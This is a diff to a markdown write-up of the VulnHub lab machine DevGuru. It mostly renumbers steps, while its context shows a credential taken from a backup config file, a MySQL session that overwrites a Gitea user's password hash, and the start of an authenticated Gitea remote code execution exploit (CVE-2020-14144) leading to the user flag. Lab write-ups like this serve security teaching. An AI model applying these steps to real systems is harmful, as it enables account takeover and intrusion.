@@ -228,8 +228,8 @@ debug                   [Status: 200, Size: 160, Words: 18, Lines: 5]
 	![](images/Pasted%20image%2020220123033744.png)
 2. View `/var/backups/app.ini.bak`
 	![](images/Pasted%20image%2020220123033838.png)
-		- gitea:UfFPTF8C8jjxVF2m
-1. Access mysql w/ gitea:UfFPTF8C8jjxVF2m
+	- gitea:UfFPTF8C8jjxVF2m
+3. Access mysql w/ gitea:UfFPTF8C8jjxVF2m
 	```
 	www-data@devguru:/var/www/html$ mysql -u gitea -p
 	Enter password: UfFPTF8C8jjxVF2m
@@ -247,10 +247,10 @@ debug                   [Status: 200, Size: 160, Words: 18, Lines: 5]
 	+-------+------------+----------+------------------+
 
 	```
-2. Unable to identify hash
-3. Generate bcrypt hash
+4. Unable to identify hash
+5. Generate bcrypt hash
 	![](images/Pasted%20image%2020220123044227.png)
-4. Change password
+6. Change password
 	```
 	MariaDB [gitea]> UPDATE user       
 		-> SET login_name = 'frank'
@@ -271,9 +271,9 @@ debug                   [Status: 200, Size: 160, Words: 18, Lines: 5]
 	Rows matched: 1  Changed: 1  Warnings: 0
 	```
 	![](images/Pasted%20image%2020220123043131.png)
-4. Login w/ frank:password
+7. Login w/ frank:password
 	![](images/Pasted%20image%2020220123043329.png)![](images/Pasted%20image%2020220123043343.png)
-5. Earlier, we found an exploit that requires authentication, run it
+8. Earlier, we found an exploit that requires authentication, run it
 	```
 	┌──(root💀kali)-[~/vulnHub/DevGuru/192.168.236.6/exploit/gitea/rce]
 	└─#  git config --global user.email "asdf@example.com"
@@ -321,9 +321,9 @@ debug                   [Status: 200, Size: 160, Words: 18, Lines: 5]
 	frank
 	```
 	![](images/Pasted%20image%2020220123045012.png)
-6. Manual exploit
+9. Manual exploit
 	- https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/
-7. Flag
+10. Flag
 	```
 	frank@devguru:/home/frank$ cat user.txt
 	cat user.txt
